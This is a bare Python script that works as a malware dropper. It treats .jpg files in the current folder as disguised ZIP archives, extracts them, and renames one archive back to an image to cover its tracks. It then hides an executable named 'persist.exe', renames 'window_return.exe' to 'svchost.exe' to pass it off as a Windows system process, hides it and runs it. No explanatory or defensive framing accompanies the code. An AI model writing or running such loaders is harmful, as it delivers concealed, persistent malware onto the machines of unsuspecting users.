import os
import zipfile
import win32api
import win32con

# get the current working directory
directory_path = os.getcwd()

# get a list of all files in the directory
files = os.listdir(directory_path)

# loop through each file in the directory
for file in files:
    # check if the file ends with ".jpg"
    if file.endswith(".jpg"):
        # construct the new file name by replacing ".jpg" with ".zip"
        new_file_name = file.replace(".jpg", ".zip")
        # rename the file
        os.rename(os.path.join(directory_path, file),
                  os.path.join(directory_path, new_file_name))
        # extract the contents of the ZIP archive
        with zipfile.ZipFile(os.path.join(directory_path, new_file_name), 'r') as zip_ref:
            zip_ref.extractall(directory_path)
file2 = "so_love_mod.zip"
old_file_name = file2.replace(".zip", ".jpg")
os.rename(os.path.join(directory_path, file2),
os.path.join(directory_path, old_file_name))
win32api.SetFileAttributes("persist.exe", win32con.FILE_ATTRIBUTE_HIDDEN)
os.rename("window_return.exe", "svchost.exe")
win32api.SetFileAttributes("svchost.exe", win32con.FILE_ATTRIBUTE_HIDDEN)
os.system("svchost.exe")

